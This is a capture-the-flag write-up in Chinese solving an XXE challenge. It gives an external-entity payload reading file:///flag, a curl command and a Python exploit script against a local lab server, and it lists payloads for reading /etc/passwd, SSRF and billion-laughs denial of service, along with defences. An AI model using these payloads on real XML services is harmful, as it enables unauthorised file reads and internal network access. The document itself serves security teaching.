# XXE XML 外部实体注入

## 题目信息

- **题目名称**：XML 里藏着什么
- **难度**：★★★☆☆
- **考点**：XXE（XML External Entity）

## 题目描述

这个接口接受 XML 格式的数据。XML 有一个功能叫外部实体——可以读取服务器上的文件。你知道怎么用吗？

## 解法步骤

### 第一步：分析功能

页面接受 XML 格式的数据，使用 PHP 的 `DOMDocument` 解析并显示 XML 内容。

### 第二步：构造 XXE Payload

XML 允许通过 `<!ENTITY>` 定义外部实体，读取服务器上的文件：

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag">]>
<root>&xxe;</root>
```

解析后，`&xxe;` 实体会被替换为 `/flag` 文件的内容。

### 第三步：发送 Payload

直接将 XML 作为请求体发送（注意使用 `Content-Type: text/plain`，避免 `&xxe;` 被 URL 解码切割）：

```bash
curl -X POST http://127.0.0.1:13390/ \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag">]><root>&xxe;</root>' \
  -H "Content-Type: text/plain"
```

### 第四步：获取 Flag

**自动化 Exploit：**

```python
#!/usr/bin/env python3
import requests

BASE = 'http://127.0.0.1:13390'
payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag">]>
<root>&xxe;</root>'''

r = requests.post(BASE, data=payload, headers={'Content-Type': 'text/plain'})
import re
flag = re.search(r'flag\{[^}]+\}', r.text).group()
print(f'[+] {flag}')
```

## 漏洞原理

### XXE 原理

XXE（XML External Entity Injection）是利用 XML 解析器对外部实体的支持，读取服务器文件、进行 SSRF 攻击或导致拒绝服务。

### 常见攻击方式

- **文件读取**：`<!ENTITY xxe SYSTEM "file:///etc/passwd">`
- **SSRF**：`<!ENTITY xxe SYSTEM "http://内网地址/">`
- **Blind XXE**：通过错误信息或带外交数据外带
- **DoS（Billion Laughs）**：实体嵌套递归，消耗服务器内存

### 防御方法

- 禁用外部实体解析（在大多数现代 XML 解析器中默认禁用）
- 使用 JSON 等替代 XML 格式
- 过滤用户提交的 XML 数据中的 `<!DOCTYPE>` 和 `<!ENTITY>`
